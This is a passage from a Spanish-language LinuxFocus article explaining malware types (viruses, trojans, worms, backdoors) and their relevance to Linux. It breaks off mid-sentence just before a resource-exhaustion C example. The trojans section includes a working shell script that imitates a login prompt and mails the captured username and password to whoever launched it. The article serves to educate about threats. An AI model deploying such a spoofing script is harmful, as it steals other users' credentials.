<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//ES">
<HTML>
<HEAD>
 <META http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
 <META NAME="GENERATOR" CONTENT="lfparser_2.21">
 <META NAME="LFCATEGORY" CONTENT="System Administration">
<!-- this is used by a number of tools:
 =LF=AUTHOR: Christophe Blaess
 =LF=CAT___: System Administration
 =LF=TITLE_: Virus: nos afecta a todos
 =LF=NUMBER: 255
 =LF=ANAME_: article255.html
 -->
 <TITLE>lf255, System Administration: Virus: nos afecta a todos</TITLE>
<!-- stylesheet added by lfparser: --> 
<style type="text/css">
<!--
 td.top {font-family: Arial,Geneva,Verdana,Helvetica,sans-serif; font-size:12 }
 pre { font-familiy:monospace,Courier }
 p.cl { color:#EE9500 }
 a.nodec { text-decoration:none }
 p.trans { font-size:8pt; text-align:right }
 p.clbox { width:50%; alignment:center; background-color:#FFD700; border-style:none; border-width:medium; border-color:#FFD700; padding:0.5cm ;  text-align:center }
 p.code { width:80%; alignment:center; background-color:#aedbe8; border-style:none; border-width:medium; border-color:#aedbe8; padding:0.1cm ;  text-align:left }
 p.foot { background-color:#AAAAAA; color:#FFFFFF; border-style:none; border-width:medium; border-color:#AAAAAA; padding:0.5cm ; margin-top:0.1cm; margin-right:1cm; margin-left:1cm; text-align:center }
-->
</style>
 
</HEAD>
<BODY bgcolor="#ffffff" text="#000000">
 <!-- this is generated html code. NEVER use this file for your
 translation work. Instead get the file with the same article number
 and .meta.shtml in its name. Translate this meta file and then
 use lfparser program to generate the final article -->
 <!-- lfparser can be obtained from http://www.linuxfocus.org/~guido/dev/lfparser.html -->

<!-- 2pdaIgnoreStart -->

<!-- start navegation bar -->
 <!-- top navegation bar -->
 <TABLE cellspacing="0" cellpadding="0" border="0" align="center" width="90%">
   <TR bgcolor="#2e2292">
     <TD class="top"><TABLE cellspacing="0" cellpadding="0" border="0" width=
       "100%">
         <TR><TD width="144"><IMG src="../../common/images/logolftop.gif"
           alt="[LinuxFocus-icon]" width="350" height="45" align="left" 
           border="0"></TD>

           <TD class="top">
             <TABLE width="100%">
               <TR align="right">
                 <TD class="top"><A class="nodec" href="../"><FONT color=
                 "#DDDDDD" size="-1">Hogar</FONT></A> &nbsp;|&nbsp; <A class=
                 "nodec" href="../map.html"><FONT color=
                 "#DDDDDD" size="-1">Mapa</FONT></A> &nbsp;|&nbsp; <A class=
                 "nodec" href="../indice.html"><FONT color=
                 "#DDDDDD" size="-1">Indice</FONT></A> &nbsp;|&nbsp; <A class=
                 "nodec" href="../Search/"><FONT color=
                 "#DDDDDD" size="-1">Busqueda</FONT></A> </TD>
               </TR>

               <TR align="right">
                 <TD class="top">
                   <HR width="100%" noshade size="1">
                 </TD>
               </TR>
             </TABLE>
           </TD>
         </TR>
       </TABLE>
     </TD>
   </TR>
 </TABLE>
 <!-- end top navegation bar -->
 <!-- blue bar -->
 <TABLE cellspacing="0" cellpadding="0" border="0" align="center"
 width="90%">
   <TR bgcolor="#00ffff">
     <TD><IMG src="../../common/images/transpix.gif" width="1" height=
     "2" alt=""></TD>
   </TR>
 </TABLE>
 <!-- end blue bar -->
 <!-- bottom navegation bar -->
 <TABLE cellspacing="0" cellpadding="0" border="0" align="center"
 width="94%">
   <TR bgcolor="#000000">
     <TD>
       <TABLE cellspacing="0" cellpadding="1" border="0" width=
       "100%">
         <TR align="center">
           <TD WIDTH="20%"><A class="nodec" href="../News/"><FONT color=
           "#FFFFFF">Noticias</FONT></A> </TD>
           <TD WIDTH="5%"><FONT color="#FFFFFF">|</FONT> </TD>
           <TD WIDTH="20%"><A class="nodec" href="../Archives/"><FONT color=
           "#FFFFFF">Arca</FONT></A> </TD>
           <TD WIDTH="5%"><FONT color="#FFFFFF">|</FONT> </TD>
           <TD WIDTH="20%"><A class="nodec" href="../Links/"><FONT color=
           "#FFFFFF">Enlaces</FONT></A> </TD>
           <TD WIDTH="5%"><FONT color="#FFFFFF">|</FONT> </TD>
           <TD WIDTH="20%"><A class="nodec" href="../aboutus.html"><FONT color=
           "#FFFFFF">Sobre LF</FONT></A> </TD>
         </TR>
       </TABLE>
     </TD>
   </TR>
 </TABLE>
 <!-- end bottom navegation bar -->
<!-- stop navegation bar -->

<!-- SSI_INFO -->

<!--#include virtual="../../dynahead.shtml" -->

<!-- SSI_INFO STOP -->
<!-- 2pdaIgnoreStop -->

<!-- SHORT BIO ABOUT THE AUTHOR -->
<TABLE ALIGN=LEFT BORDER=0  WIDTH="30%" >
<TR>
<TD>

<!-- 2pdaIgnoreStart -->
<!-- PALM DOC -->
<TABLE BORDER=0 hspace=4 vspace=4> <TR> <TD>
<font size=1> <img src="../../common/images/2doc.gif" width=34 align=left border=0 height=22 alt="convert to palm"><a href="http://cgi.linuxfocus.org/cgi-bin/2ztxt">Convert to GutenPalm</a><br>or <a href="http://cgi.linuxfocus.org/cgi-bin/2pda">to PalmDoc</a></font>
</TD> </TR> </TABLE>
<!-- END PALM DOC -->
<!-- 2pdaIgnoreStop -->
<br>
<img src="../../common/images/Christophe-Blaess.jpg" width=
"100" height="138" alt="Christophe Blaess">
<BR>por  Christophe Blaess <a href="http://perso.club-internet.fr/ccb/"><font size="1">(homepage)</font></a>
<BR><BR>
<I>Sobre el autor:</I><BR>
<p>Christophe Blaess es un ingeniero aeron&aacute;utico independiente.
Es un apasionado de Linux y realiza la mayor&iacute;a de su trabajo en
este sistema. Coordina la traducci&oacute;n de las p&aacute;ginas de manual
publicadas por el <i>Linux Documentation Project</i>.</p>
<!-- TRANSLATED TO es -->
<BR><BR><I>Taducido al espa&ntilde;ol por:</I><BR>
Roberto Hernando (<a href="http://rhernando.ya.st"><font size="1">homepage</font></a>)
<br>
<!-- TRANSLATED TO STOP -->
<BR><i>Contenidos</i>:
<UL>
  <LI><A HREF="#255lfindex0">Pre&aacute;mbulo</A></LI>
  <LI><A HREF="#255lfindex1">Introducci&oacute;n</A></LI>
  <LI><A HREF="#255lfindex2">Virus</A></LI>
  <LI><A HREF="#255lfindex3">Troyanos y bombas l&oacute;gicas</A></LI>
  <LI><A HREF="#255lfindex4">Gusanos</A></LI>
  <LI><A HREF="#255lfindex5">Puertas traseras</A></LI>
  <LI><A HREF="#255lfindex6">Y &iquest;qu&eacute; pasa con Linux ?</A></LI>
  <LI><A HREF="#255lfindex7">Bombas l&oacute;gicas</A></LI>
  <LI><A HREF="#255lfindex8">Virus</A></LI>
  <LI><A HREF="#255lfindex9">Caballos de Troya</A></LI>
  <LI><A HREF="#255lfindex10">Gusanos</A></LI>
  <LI><A HREF="#255lfindex11">Puertas traseras</A></LI>
  <LI><A HREF="#255lfindex12">Conclusi&oacute;n</A></LI>
  <LI><A HREF="#255lfindex13">Bibliograf&iacute;a</A></LI>
  <LI><A HREF="http://cgi.linuxfocus.org/cgi-bin/lftalkback?anum=255&amp;lang=es">Formulario de "talkback" para este art&iacute;culo</A></LI>
</UL>

</TD></TR></TABLE>
<!-- HEAD OF THE ARTICLE -->
<br>&nbsp;
<H2>Virus: nos afecta a todos</H2>
 <img src="../../common/images/article255/virus.gif" width=
"178" height="178" alt="virus" hspace="10">
<!-- ABSTRACT OF THE ARTICLE -->
<P><i>Resumen</i>:
<P>


   Este art&iacute;culo se ha publicado en un n&uacute;mero especial sobre la seguridad de
Linux
Magazine France. El editor, los autores y los traductores han aceptado
amablemente que todos
los art&iacute;culos de ese n&uacute;mero especial sean publicados en LinuxFocus. En
consecuencia,
LinuxFocus os "ofrecer&aacute;" esos art&iacute;culos a medida que se vayan traduciendo
al ingl&eacute;s.
Este resumen se reproducir&aacute; en todos los art&iacute;culos que tengan el mismo
origen.</P></P>
<HR size="2" noshade align="right"><BR>
<!-- BODY OF THE ARTICLE -->


<A NAME="255lfindex0">&nbsp;</A>
<H2>Pre&aacute;mbulo</H2>


<p>Este art&iacute;culo trata los problemas de seguridad interna que
pueden aparecer en sistemas Linux por culpa de software maligno.
Este tipo de software puede causar da&ntilde;o sin intervenci&oacute;n humana: Virus,
Gusanos, Troyanos, etc. Profundizaremos en las distintas vulnerabilidades,
insistiendo en las ventajas y los inconvenientes del software libre en
esta
materia.  </p>

<A NAME="255lfindex1">&nbsp;</A>
<H2>Introducci&oacute;n</H2>


<p>Existen principalmente cuatro tipos distintos de amenaza,
que pueden resultar confusos para el usuario, especialmente
porque habitualmente un ataque suele utilizar varios mecanismos:</p>

<ul>
  <li><em>Virus</em> se reproducen infectando el cuerpo de los
  programas que los contienen;</li>

  <li><em>Troyanos</em> ejecutan tareas escondi&eacute;ndose en
  aplicaciones de aspecto inofensivo;</li>

  <li><em>Gusanos</em> se aprovechan de las redes de ordenadores
  para propagarse, usando por ejemplo el correo electr&oacute;nico;</li>

  <li><em>Puertas traseras</em> permiten a un usuario externo
  tomar el control de una aplicaci&oacute;n de forma indirecta.</li>
</ul>

<p>La clasificaci&oacute;n no es siempre tan sencilla; por ejemplo, existen
programas que unos consideran virus y otros gusanos, haciendo
la decisi&oacute;n final muy complicada. Esto no es demasiado importante
considerando el &aacute;mbito de este art&iacute;culo, que es aclarar qu&eacute;
peligros pueden amenazar a un sistema Linux.</p>

<p>Contrariamente a lo que com&uacute;nmente se cree, estas
cuatro plagas tambi&eacute;n existen en Linux. Por supuesto, los
virus encuentran aqu&iacute; un terreno menos propicio para diseminarse
que en DOS, por ejemplo, pero no se debe descuidar el peligro
presente. Por tanto, vamos a analizar qu&eacute; riesgos existen.</p>


<b>Amenazas potenciales</b>

<A NAME="255lfindex2">&nbsp;</A>
<H3>Virus</H3>


<p>Un virus es un trozo de c&oacute;digo  instalado en el seno de un programa
ejecutable llamado host, capaz de duplicarse a s&iacute; mismo infectando un
nuevo
fichero ejecutable.  Los virus aparecieron en los setenta, cuando los
programadores de entonces jugaban a un juego llamado la "<em>core
war</em>". Este juego llegaba desde los laboratorios Bell AT&amp;T
<a href="#bib">[MARSDEN 00]</a>. El objetivo del juego era ejecutar
en paralelo, en un &aacute;rea de memoria restringida, peque&ntilde;os programas capaces
de destruirse mutuamente. El sistema operativo no prove&iacute;a protecci&oacute;n
entre las &aacute;reas de memoria de los programas, lo que permit&iacute;a la
agresi&oacute;n m&uacute;tua con la meta de matar a los adversarios. Para hacerle
algunos "bombardeaban" con '0' el mayor &aacute;rea de memoria posible, mientras
otros se mov&iacute;an permanentemente en el espacio de direcciones, esperando
sobreescribir el c&oacute;digo del adversario, y a veces, algunos de ellos
cooperaban
para eliminar un "enemigo" dif&iacute;cil.</p>

<p>Los algoritmos implementados para el juego se tradujeron
a un lenguaje ensamblador creado especialmente para la ocasi&oacute;n,
el "<em>red code</em>", que se ejecutaba mediante un emulador
disponible en la mayor&iacute;a de las m&aacute;quinas existentes. El inter&eacute;s en el
juego era fruto de una simple curiosidad cient&iacute;fica, como el entusiasmo
hacia
el Juego de la Vida de Conway, los fractales, los algoritmos gen&eacute;ticos,
etc.</p>

   <p>Sin embargo, tras la sucesi&oacute;n de art&iacute;culos sobre la <em>core
war</em>, publicados en <em>Scientific American</em>
<a href="#bib">[DEWDNEY 84]</a>, ocurri&oacute; lo inevitable y
algunos empezaron a escribir trozos de c&oacute;digo auto-replicante
especialmente dedicado al sector de arranque de los disquetes
o a ficheros ejecutables, primero en ordenadores Apple, y
despu&eacute;s en MacIntosh y PCs.</p>

<p>El sistema operativo MS DOS fue el entorno elegido para la
proliferaci&oacute;n de los virus: ficheros ejecutables est&aacute;ticos con un formato
conocido, sin protecci&oacute;n de memoria, ausencia de seguridad mediante
permisos de acceso a los
ficheros, amplio uso de programas residentes  <em>TSR</em>
apilados en memoria, etc. Tenemos que a&ntilde;adir a todo esto el
car&aacute;cter de los usuarios, intercambi&aacute;ndose  a todas horas
programas ejecutables en disquetes sin ning&uacute;n cuidado en el origen
de los ficheros.</p>

<p>En su forma m&aacute;s simple, un virus es un peque&ntilde;o trozo de
c&oacute;digo que se ejecutar&aacute; adicionalmente cuando se lance una
aplicaci&oacute;n. Aprovechar&aacute; ese momento para buscar otros ficheros
ejecutables que no est&eacute;n todav&iacute;a infectados, se incrustar&aacute; en ellos
(preferiblemente dejando el programa original intacto para mayor
discreci&oacute;n) y terminar&aacute;. Cuando lanzemos el nuevo fichero ejecutable,
todo el proceso comenzar&aacute; de nuevo.</p>

<p>Los virus pueden beneficiarse de un gran arsenal de "armas" para
auto-replicarse. En <a href="#bib">[LUDWIG 91]</a> y <a
href="#bib">[LUDWIG 93]</a>
hay una detallada descripci&oacute;n de los virus para DOS, usando
sofisticadas formas de esconderse de los programas antivirus:
encriptaci&oacute;n aleatoria, cambios permanentes en el c&oacute;digo, etc. Incluso
es posible encontrar virus que usan algoritmos gen&eacute;ticos para optimizar
su capacidad de supervivencia y reproducci&oacute;n. Se puede encontrar
informaci&oacute;n de este tipo en un famos&iacute;simo art&iacute;culo: <a
href="#bib">[SPAFFORD 94]</a>.</p>

<p>Pero tenemos que tener presente que m&aacute;s all&aacute; de un
tipo de experimentos sobre vida artificial, los virus inform&aacute;ticos
pueden causar importantes da&ntilde;os. El principio de la replicaci&oacute;n
m&uacute;ltiple de un trozo de c&oacute;digo s&oacute;lo es un desperdicio de espacio
(de disco y de memoria), pero los virus se usan como un soporte
- agente de transporte - para otras entidades mucho m&aacute;s desagradables:
las <em>bombas l&oacute;gicas</em>, que encontraremos tambi&eacute;n
en los troyanos.</p>

<A NAME="255lfindex3">&nbsp;</A>
<H3>Troyanos y bombas l&oacute;gicas</H3>

<cite>Timeo Danaos et dona ferentes - Temo a los griegos
incluso cuando hacen un regalo.</cite> (Virgilio, la  <em>Eneida</em>,
II, 49).

<p>Los troyanos, sitiados, tuvieron la mala idea de entrar
en su poblado una gran estatua de madera que representaba
un caballo, abandonada por los atacantes griegos como una
ofrenda religiosa. El caballo de Troya ocultaba en su interior una
tropa cuyos miembros, una vez infiltrados, se aprovecharon de la
noche para atacar el poblado desde su interior, esto permiti&oacute;
a los griegos ganar la Guerra de Troya.</p>

<p>El famoso t&eacute;rmino "caballo de Troya" (o simplemente troyano)
se utiliza a menudo en el campo de la seguridad inform&aacute;tica para designar
una aplicaci&oacute;n <em>a priori</em> inofensiva, que como los virus
mencionados
anteriormente, porta un c&oacute;digo destructivo llamado <em>bomba
l&oacute;gica</em>.</p>

<p>Una bomba l&oacute;gica es una parte  intencionadamente
da&ntilde;ina de un programa cuyos efectos pueden ser muy variados:

<ul>
    <li>consumo abusivo de los recursos del sistema (memoria, disco
    duro, CPU, etc.);</li>

  <li>r&aacute;pida destrucci&oacute;n del mayor n&uacute;mero de ficheros posible
  (sobreescribi&eacute;ndolos para evitar que se pueda recuperar su
  contenido);</li>

  <li>destrucci&oacute;n disimulada de un fichero de vez en cuando,
  para permanecer invisible el mayor tiempo posible;</li>

  <li>ataque a la seguridad del sistema (implementaci&oacute;n
  de derechos de acceso muy permisivos, env&iacute;o del fichero de
  contrase&ntilde;as a una direcci&oacute;n de internet, etc.);</li>

  <li>uso de la m&aacute;quina para terrorismo inform&aacute;tico, como un
  DDoS  (<em>Distributed Denial of Service</em>, Denegaci&oacute;n
  de Servicio) como se menciona en el ya famoso art&iacute;culo
  <a href="#bib">[GIBSON 01]</a>;</li>

  <li>inventario de n&uacute;meros de licencia de las aplicaciones
  en el disco y env&iacute;o de los mismos a un programador.</li>
</ul>

En algunos casos la bomba l&oacute;gica puede estar escrita para
un sistema objetivo espec&iacute;fico en el que se intentar&aacute; robar
informaci&oacute;n confidencial, destruir ciertos ficheros o desacreditar
a un usuario tomando su identidad. La misma bomba ejecutada
en cualquier otro sistema ser&aacute; inofensiva.

<p>La bomba l&oacute;gica tambi&eacute;n puede intentar destruir f&iacute;sicamente
el sistema en el que reside. Las posibilidades son muy peque&ntilde;as
pero existen (borrado de memorias CMOS, cambio en la memoria
flash de modems, movimientos destructivos de cabezales de impresoras,
plotters, esc&aacute;neres, movimiento acelerado de las cabezas lectoras
de los discos duros ...)</p>

<p>Para seguir con la met&aacute;fora "explosiva", digamos que
una bomba l&oacute;gica requiere un detonador para ser activada.
En efecto, la generaci&oacute;n de acciones devastadoras de troyanos
o virus en una primera ejecuci&oacute;n es una mala t&aacute;ctica desde el
punto de vista de la eficiencia. Tras instalar la bomba l&oacute;gica, es mejor
para ella esperar antes de explosionar. Esto incrementar&aacute; las
oportunidades de extenderse a otros sistemas en el caso de transmisi&oacute;n
por virus; y en el caso de un troyano evitar&aacute; que el usuario
relacione f&aacute;cilmente la instalaci&oacute;n de la nueva aplicaci&oacute;n con
el comportamiento anormal de su m&aacute;quina.</p>

<p>Como en cualquier acci&oacute;n maligna, el mecanismo de lanzamiento
puede variar:  diez d&iacute;as despu&eacute;s de la instalaci&oacute;n, borrado de una
cuenta de usuario dada (licencia), teclado y rat&oacute;n inactivos durante
30 minutos, gran actividad en la cola de impresi&oacute;n... &iexcl;no faltan
posibilidades! Los troyanos m&aacute;s famosos son los protectores de
pantalla aunque hoy en d&iacute;a ya est&aacute;n muy trillados. Tras un aspecto
atractivo, estos programas son capaces de hacer da&ntilde;o con toda
tranquilidad,
especialmente si la bomba l&oacute;gica s&oacute;lo se activa despu&eacute;s de una
hora, lo que casi asegura que el usuario no est&aacute; frente a su
ordenador.</p>

<p>Otro ejemplo famoso de troyano es el siguiente script,
que muestra una pantalla que pide usuario/contrase&ntilde;a, enviando
la informaci&oacute;n a la persona que lo lanza y saliendo. Si se
ejecuta en un terminal, este script capturar&aacute; la contrase&ntilde;a
del siguiente usuario que intente conectarse.</p>

<pre>
#! /bin/sh

clear
cat /etc/issue
echo -n "login: "
read login
echo -n "Password: "
stty -echo
read passwd
stty sane
mail $USER &lt;&lt;- fin
    login: $login
    passwd: $passwd
fin
echo "Login incorrect"
sleep 1
logout
</pre>

<p>Para conseguir que se desconecte cuando termine, se debe
lanzar con el comando  <code>exec</code>. La v&iacute;ctima pensar&aacute;
que se ha equivocado tecleando cuando vea el mensaje
"<em>Login incorrect</em>" y se conectar&aacute; de nuevo de una forma
normal. Versiones m&aacute;s avanzadas llegan a simular el di&aacute;logo de
conexi&oacute;n X11. Para impedir este tipo de trampa, es una buena
idea usar primero un falso usuario/contrase&ntilde;a cuando se accede
a un terminal (&eacute;ste es un reflejo que se puede adquirir muy r&aacute;pido).</p>

<A NAME="255lfindex4">&nbsp;</A>
<H3>Gusanos</H3>

<cite>Y Paul se encontr&oacute; con el gusano, exultante, como un
Emperador dominando el universo.</cite> (F. Herbert
"<em>Dune</em>")

<p>Los "<em>gusanos</em>" siguen el mismo principio que
los virus. Son programas que intentan replicarse a s&iacute; mismos
para conseguir una propagaci&oacute;n m&aacute;xima. Aunque no es su
principal caracter&iacute;stica, tambi&eacute;n pueden contener una bomba
l&oacute;gica con un detonador retardado. La diferencia entre los gusanos
y los virus la da el hecho de que los gusanos no utilizan programas
host como medio de transporte, sino que se benefician de las capacidades
que proveen las redes, como el correo electr&oacute;nico, para propagarse
de m&aacute;quina en m&aacute;quina.</p>

<p>El nivel t&eacute;cnico de los gusanos es bastante alto; usan las
vulnerabilidades de software que ofrecen los servicios de red
para forzar su auto-duplicaci&oacute;n en una m&aacute;quina remota. El
arquetipo es el "<em>Internet Worm</em>" de 1988.</p>

<p>El <em>Internet Worm</em> es un ejemplo de gusano puro,
sin contener una bomba l&oacute;gica, sin embargo su involuntario efecto
devastador
fue terrible. Se puede encontrar una peque&ntilde;a pero precisa descripci&oacute;n
en  <a href="#bib">[KEHOE 92]</a> o un an&aacute;lisis detallado en
<a href="#bib">[SPAFFORD  88]</a> o <a href="#bib">[EICHIN 89]</a>.
Hay tambi&eacute;n una explicaci&oacute;n menos t&eacute;cnica pero m&aacute;s excitante en
<a href="#bib">[STOLL 89]</a> (de la saga <em>El huevo
del cuco</em>), donde el delirio de los equipos luchando con
este gusano trae despu&eacute;s el p&aacute;nico de los administradores cuyos
sistemas eran afectados.</p>

<p>En resumen, este gusano era un programa escrito por Robert
Morris Jr, estudiante de la Universidad de Cornell, ya conocido por
un art&iacute;culo sobre problemas de seguridad en los protocolos de red
<a href="#bib">[MORRIS 85]</a>. Era el hijo de uno de los encargados
de la seguridad inform&aacute;tica en la NSCS, secci&oacute;n de la NSA.
  El programa se lanz&oacute; al caer la tarde del 2 de noviembre de 1988
y paraliz&oacute; la mayor&iacute;a de los sistemas conectados a Internet.  Trabajaba
en varias etapas:</p>

<ol>
  <li>Una vez que un ordenador era infiltrado, el gusano intentaba
  propagarse por la red. Para obtener direcciones iba leyendo
  los ficheros de sistema y llamaba a utilidades como <code>netstat</code>
  obteniendo informaci&oacute;n sobre las interfaces de red.</li>

  <li>Despu&eacute;s, intentaba introducirse en las cuentas de usuario. Para
  hacerlo, comparaba el contenido de un diccionario con el fichero
  de contrase&ntilde;as. Adem&aacute;s, intentaba usar como contrase&ntilde;as
  combinaciones del nombre de usuario (al rev&eacute;s, repeticiones, etc).
  Esta fase contaba con una primera vulnerabilidad: contrase&ntilde;as
  encriptadas en un fichero con permisos de lectura
(<code>/etc/passwd</code>),
  aprovech&aacute;ndose as&iacute; de los usuarios que hab&iacute;an hecho una mala elecci&oacute;n
  de la contrase&ntilde;a. Esta primera vulnerabilidad se puede solventar
  ahora usando las <em>shadow
  passwords</em>.</li>

  <li>Si consegu&iacute;a introducirse en las cuentas de usuario, el gusano
  intentaba encontrar m&aacute;quinas que proveyeran un acceso directo
  sin identificaci&oacute;n, utilizando los ficheros <code>~/.rhost</code> y
  <code>/etc/hosts.equiv</code>. En ese caso, utilizaba <code>rsh</code>
  para ejecutar instrucciones en la m&aacute;quina remota. As&iacute;, era
  capaz de copiarse a s&iacute; mismo en el nuevo host y el ciclo
  comenzaba de nuevo.</li>

  <li>Otra forma de introducirse en otra m&aacute;quina era aprovechar una
  segunda vulnerabilidad:

  explotar un desbordamiento de buffer de <code>fingerd</code>.
  (V&eacute;ase nuestra serie sobre
  programaci&oacute;n segura: <a href="../January2001/article182.shtml">
  Evitando agujeros de seguridad al desarrollar una aplicaci&oacute;n - Parte
1</a>, <a href=
  "../March2001/article183.shtml">Evitando agujeros de seguridad al
desarrollar una aplicaci&oacute;n
   - Parte 2: memoria, pila y funciones, c&oacute;digo shell</a>, <a href=
  "../May2001/article190.shtml">Evitando agujeros de seguridad al
desarrollar una aplicaci&oacute;n
   - Parte 3: desbordamientos de buffer</a>.)<br>
   Este error permit&iacute;a la ejecuci&oacute;n de c&oacute;digo remotamente. Entonces
   el gusano era capaz de copiarse a s&iacute; mismo en el nuevo
   sistema y empezar de nuevo. De hecho, esto s&oacute;lo
   funcionaba en cierto tipo de procesadores.</li>

  <li>Por &uacute;ltimo, se utilizaba una tercera vulnerabilidad:
  una opci&oacute;n de depuraci&oacute;n, activa por defecto en el demonio
  <code>sendmail</code>, que permit&iacute;a enviar correo
  desde la entrada est&aacute;ndar al programa indicado como destino.
  Est&aacute; opci&oacute;n jam&aacute;s deber&iacute;a estar activa en m&aacute;quinas en
  producci&oacute;n, pero, desafortunadamente la mayor&iacute;a de los
  administradores ignoraban su existencia.</li>
</ol>

<p>Tengamos en cuenta que una vez que el gusano era capaz
de ejecutar algunas instrucciones en la m&aacute;quina remota, la forma
de copiarse a s&iacute; mismo era algo compleja. Requer&iacute;a la transmisi&oacute;n
de un peque&ntilde;o programa C, recompilarlo en el sitio y entonces
lanzarlo. Entonces, se establec&iacute;a una conexi&oacute;n TCP/IP con el
ordenador inicial y se obten&iacute;an todos los binarios del gusano de nuevo.
Esto &uacute;ltimo,  precompilado, exist&iacute;a para varias arquitecturas
(Vax y Sun), y fue probado una detr&aacute;s de otra. Adem&aacute;s, el gusano
era muy listo escondi&eacute;ndose, sin dejar huella.</p>

<p>Desgraciadamente, el mecanismo que evitaba que un ordenador
fuera infectado varias veces no funcion&oacute; como se esperaba y el
aspecto nocivo del gusano <em>Internet 88</em>, sin contener
una bomba l&oacute;gica, fue la sobrecarga de los sistemas afectados
(notablemente con un bloqueo en el correo electr&oacute;nico, que caus&oacute;
un retraso en la difusi&oacute;n de soluciones).</p>

El autor del gusano fue a prisi&oacute;n por alg&uacute;n tiempo.

<p>Los gusanos son relativamos raros debido a su complejidad.
No se deben mezclar con otro tipo de peligros, como los virus
transmitidos como adjuntos a un correo electr&oacute;nico como el
famoso "<em>ILoveYou</em>". Los virus son mucho m&aacute;s simples
ya que son macros escritas (en Basic) para aplicaciones de
ofim&aacute;tica que se lanzan autom&aacute;ticamente cuando se lee el correo.
Esto s&oacute;lo funciona en algunos sistemas operativos, cuando el
lector de correo est&aacute; configurado de forma demasiado simple.
Estos programas se parecen m&aacute;s a los troyanos que a los gusanos,
ya que requieren una acci&oacute;n del usuario para ejecutarse.</p>

<A NAME="255lfindex5">&nbsp;</A>
<H3>Puertas traseras</H3>


<p>Las <em>puertas traseras (backdoors)</em> se pueden
comparar con los troyanos pero no son id&eacute;nticas. Una puerta
trasera permite a un usuario ("avanzado") actuar en una aplicaci&oacute;n
para cambiar su comportamiento. Se puede comparar con los
<em>cheat codes</em>  usados en los juegos para obtener
m&aacute;s recursos, alcanzar un nivel superior, etc. Pero tambi&eacute;n
afecta a aplicaciones cr&iacute;ticas como autentificaci&oacute;n de conexiones
o correo electr&oacute;nico, ya que pueden tener un acceso oculto
con una contrase&ntilde;a conocida s&oacute;lo por el creador del software.</p>

<p>Los programadores con la intenci&oacute;n de facilitar la fase de depuraci&oacute;n,
a menudo dejan una peque&ntilde;a puerta abierta para poder usar
el software sin hacerlo a trav&eacute;s del mecanismo de autentificaci&oacute;n,
incluso cuando la aplicaci&oacute;n se ha instalado en el cliente. A veces
hay mecanismos de acceso oficial que usan contrase&ntilde;as defecto
(<code>system</code>,
<code>admin</code>, <code>superuser</code>, etc) pero no
est&aacute; muy claro qu&eacute; lleva a los administradores dejarlas puestas.</p>

<p>Recu&eacute;rdese los diferentes accesos ocultos que permit&iacute;an dialogar
con el n&uacute;cleo del sistema  en la pel&iacute;cula "<em>Wargame</em>",
pero podemos encontrar art&iacute;culos anteriores sobre tales pr&aacute;cticas.
En un art&iacute;culo incre&iacute;ble, <a href="#bib">[THOMPSON 84]</a>, Ken
Thompson, uno de los padres de Unix, describe un acceso escondido
que implement&oacute; en los sistemas Unix hace varios a&ntilde;os:</p>

<ul>
  <li>Cambi&oacute; la aplicaci&oacute;n <code>/bin/login</code> para incluir
  un peque&ntilde;o c&oacute;digo, que permit&iacute;a el acceso directo al sistema
  escribiendo una contrase&ntilde;a incluida de forma precompilada
  (no tomada de <code>/etc/passwd</code>). De esta forma,
  Thompson pod&iacute;a visitar todos los sistemas usando su versi&oacute;n
  de <code>login</code>.</li>

  <li>Sin embargo, entonces los fuentes de las aplicaciones estaban
  disponibles (como hoy en el software libre). Luego el c&oacute;digo
  fuente <code>login.c</code> estaba presente en los sistemas
  Unix y cualquiera podr&iacute;a haber le&iacute;do el c&oacute;digo incluido. As&iacute; pues,
  Thompson puso un <code>login.c</code> limpio sin la
  puerta de acceso.</li>

  <li>El problema era que cualquier administrador pod&iacute;a recompilar
    <code>login.c</code> eliminando as&iacute; la versi&oacute;n falsa. Entonces,
    Thompson modific&oacute; el compilador est&aacute;ndar de C para hacerle
    capaz de incluir la puerta trasera cuando notara que alguien
    intentaba compilar <code>login.c</code>.</li>

  <li>Pero, de nuevo, el c&oacute;digo fuente del compilador <code>cc.c</code>
  estaba disponible y cualquiera pod&iacute;a leer y recompilar el compilador.
  As&iacute; pues, Thompson puso un c&oacute;digo fuente limpio del compilador,
  pero el fichero binario, ya procesado, era capaz de identificar
  sus propios ficheros fuente, incluyendo el c&oacute;digo usado para
  infectar  <code>login.c</code>..</li>
</ul>


<p>&iquest;Qu&eacute; se puede hacer contra esto? Bien, &iexcl;nada! La &uacute;nica
forma ser&iacute;a recomenzar con un sistema completamente virgen. A
menos que construyamos una m&aacute;quina a partir de cero creando
todo el microc&oacute;digo, el sistema operativo, los compiladores, las
utilidades, no podemos estar seguros de que todas
las aplicaciones est&eacute;n limpias, incluso si est&aacute; disponible el c&oacute;digo
fuente.</p>

<A NAME="255lfindex6">&nbsp;</A>
<H2>Y &iquest;qu&eacute; pasa con Linux ?</H2>


<p>Hemos presentado los principales peligros para cualquier sistema.
Ahora echemos un vistazo a los riesgos que afectan al software
libre y a Linux.</p>

<A NAME="255lfindex7">&nbsp;</A>
<H3>Bombas l&oacute;gicas</H3>


<p>Primero, veamos qu&eacute; da&ntilde;os puede causar una bomba l&oacute;gica
cuando se ejecuta en un sistema Linux. Naturalmente, esto variar&aacute;
dependiendo del efecto buscado y de los privilegios del usuario
bajo cuya identidad se lance.</p>

<p>En lo que concierne a la destrucci&oacute;n de ficheros del sistema o
a la lectura de datos confidenciales, se tienen dos casos. Si la bomba
se ejecuta bajo la identidad de <em>root</em>, tendr&aacute; todo el poder
en la m&aacute;quina, incluyendo el borrado de cualquier partici&oacute;n y las
eventuales amenazas al hardware antes mencionadas. Si se
ejecuta bajo cualquier otra identidad, no ser&aacute; m&aacute;s destructiva
que lo que puede ser cualquier usuario sin privilegios por s&iacute; mismo.
S&oacute;lo podr&aacute; destruir los datos pertenecientes a ese usuario.
Es este caso, cualquiera debe hacerse cargo de sus propios ficheros.
Un administrador de sistema concienzudo har&aacute; muy pocas
tareas cuando acceda como <em>root</em>, lo que reduce
la probabilidad de lanzar una bomba l&oacute;gica bajo esta cuenta.</p>

<p>El sistema Linux es bastante bueno en la protecci&oacute;n de accesos
a los datos privados y al hardware, sin embargo es sensible
a los ataques dirigidos a hacerlo inoperativo haciendo un consumo
excesivo de los recursos. Por ejemplo, el siguiente programa C
es dif&iacute;cil de parar, incluso cuando se ejecuta como un usuario
normal, ya que, si el n&uacute;mero de procesos por usuario no est&aacute; limitado,
   se "comer&aacute;" todas las entradas disponibles de la tabla de procesos
